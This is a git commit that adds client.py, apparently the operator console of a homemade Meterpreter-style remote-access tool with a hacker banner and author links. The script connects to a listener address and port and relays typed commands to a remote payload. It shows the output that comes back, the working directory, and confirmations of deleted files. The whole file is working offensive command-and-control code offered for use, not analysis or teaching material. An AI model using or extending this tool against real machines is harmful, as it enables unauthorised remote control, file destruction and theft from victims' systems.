e79cd91e157cf4aff001f26f2b656e9e0b1a61b3
MRz RanJel <122773869+MReza-R4nJel@users.noreply.github.com>
2024-05-12 21:01:17 +0330

    Add files via upload

---
+++ client.py
@@ -0,0 +1,74 @@
+from socket import *
+from colorama import Fore as f 
+import argparse
+import os
+
+os.system('cls')
+
+banner = f"""{f.RED}⠀⠀⠀
+            ⠀⠀⠀⢠⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀
+        ⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{f.RED}⠀⠀⠀⠀⠀
+        ⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠘⣿⣿⣿⣿⠟⠁⠀⠀⠀⠹⣿⣿⣿⣿⣿⠟⠁⠀⠀⠹⣿⣿⡿⠀⠀⠀⠀⠀  {f.YELLOW}github : {f.GREEN}github.com/RoXset{f.RED}
+        ⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢼⣿⠀⢿⣿⣿⣿⣿⠀⣾⣷⠀⠀⢿⣿⣷⠀⠀⠀⠀⠀   {f.YELLOW}Telegram : {f.GREEN}t.me/RoXset{f.RED}
+        ⠀⠀⠀⢠⣿⣿⣿⣷⡀⠀⠀⠈⠋⢀⣿⣿⣿⣿⣿⡀⠙⠋⠀⢀⣾⣿⣿⠀⠀⠀⠀⠀
+        ⢀⣀⣀⣀⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣾⣿⣷⣦⣤⣴⣿⣿⣿⣿⣤⠤⢤⣤⡄
+        ⠈⠉⠉⢉⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣀⣀⣀⡀⠀
+        ⠐⠚⠋⠉⢀⣬⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣥⣀⡀⠈⠀⠈⠛{f.RED}
+        ⠀⠀⠴⠚⠉⠀⠀⠀⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠉⠛⠢⠀⠀
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
+        ⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
+           ⢸⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+        """
+
+print(banner)
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-LHOST' , dest='HOST' , help="~> LHOST" , required=True)
+parser.add_argument('-LPORT' , dest='PORT' , help="~> LHOST" , required=True)
+args = parser.parse_args()
+ip = args.HOST
+port = args.PORT
+server = socket()
+CONNECTION = False
+try:
+    server.connect((ip, int(port)))
+except:
+    print(f'{f.RED}[!] {f.WHITE}Connection failed !!')
+    exit()
+server.sendall('meterpreter started'.encode())
+while True:
+    try:
+        r_msg = server.recv(1024).decode()
+        CWD = r_msg.split("::::::::::")[0]
+        re_msg = r_msg.split('::::::::::')[1]
+        input_text = f"{f.WHITE}meterpreter [ {f.RED}{CWD.replace('CWD PAYLOAD ','')}{f.WHITE} ] > "
+        if re_msg not in ['meterpreter','cd successfully','FILE DELETED #METERPRETER'] and 'CWD PAYLOAD' not in re_msg:
+            print(re_msg)
+        if re_msg == "FILE DELETED #METERPRETER":
+            print(f'    {f.GREEN}[*] {f.WHITE}File deleted succesfully !!')
+        msg = input(input_text)
+        if msg not in ["cls","clear"]:server.sendall(msg.encode())
+        elif msg in ['cls','clear']:
+            try:os.system('cls')
+            except:os.system('clear')
+            continue
+        if msg == 'exit':
+            exit()
+    except IndexError:
+        pass
+    except KeyboardInterrupt:
+        print(f'\n{f.RED}    [~] {f.WHITE}Program exit !!')
+        exit()
